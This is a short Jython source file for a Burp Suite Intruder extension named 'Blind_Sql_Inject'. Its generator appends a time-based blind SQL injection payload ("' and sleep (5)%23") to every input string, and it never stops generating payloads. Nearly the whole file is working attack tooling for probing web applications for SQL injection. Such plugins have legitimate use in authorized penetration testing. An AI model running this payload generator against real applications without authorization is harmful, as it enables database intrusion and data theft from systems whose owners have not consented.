#-*- coding:utf8 -*-

from burp import IBurpExtender
from burp import IIntruderPayloadGeneratorFactory
from burp import IIntruderPayloadGenerator

from java.util import List, ArrayList

import datetime

class BurpExtender(IBurpExtender, IIntruderPayloadGeneratorFactory):

    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()

        callbacks.registerIntruderPayloadGeneratorFactory(self)

        return

    def getGeneratorName(self):
        return "Blind_Sql_Inject"

    def createNewInstance(self, attack):
        return sqlFuzzer(self, attack)

class sqlFuzzer(IIntruderPayloadGenerator):
    def __init__(self, extender, attack):
        self._extender = extender
        self._helpers = extender._helpers
        self._attack = attack
        # self.max_payload = 1
        # self.num_iterations = 0
        return

    def hasMorePayloads(self):
        # if self.num_iterations == self.max_payload:
        #     return False
        # else:
        return True

    def getNextPayload(self, current_payload):
        payload = "".join(chr(x) for x in current_payload)
        # start_time = datetime.datetime.now()
        payload = self.mutate_payload(payload)
        # end_time = datetime.datetime.now()
        # self.num_iterations += 1
        return payload

    def mutate_payload(self, original_payload):

        payload = original_payload + "' and sleep (5)%23"

        return payload
